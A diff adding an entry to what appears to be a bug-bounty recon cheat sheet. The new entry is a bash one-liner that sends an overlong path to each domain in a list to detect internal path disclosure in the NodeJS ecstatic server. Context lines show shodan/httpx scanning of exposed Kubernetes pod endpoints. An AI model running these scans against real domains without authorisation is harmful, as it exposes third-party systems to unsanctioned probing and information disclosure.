@@ -361,3 +361,15 @@ curl -s "https://www.googletagmanager.com/gtm.js?id=[TARGET-GTM-ID]" | grep -oP 
 ```
 shodan search org:"google" product:"Kubernetes" | awk '{print $3}' | httpx -path /pods -content-length -status-code -title
 ```
+
+────────────────────────────────────────────────────────────────────────
+
+# NodeJS Elastic Internal File Disclosure.
+
+## Reference:
+https://tripla.dk/2020/03/26/multiple-vulnerabilities-in-nodejs-ecstatic-http-server-http-party/#:~:text=4.%20INTERNAL%20PATH%20DISCLOSURE
+
+## OneLiner
+```
+while read -r domain; do url="$domain/$(python3 -c 'print("A"*500)')"; response=$(curl -s "$url" 2>/dev/null); if echo "$response" | grep -q "ENAMETOOLONG.*stat"; then echo -e "[VULNERABLE] $url\n$(echo "$response" | grep 'ENAMETOOLONG')"; else echo "[SAFE] $domain"; fi; done < listofdomain.txt
+```
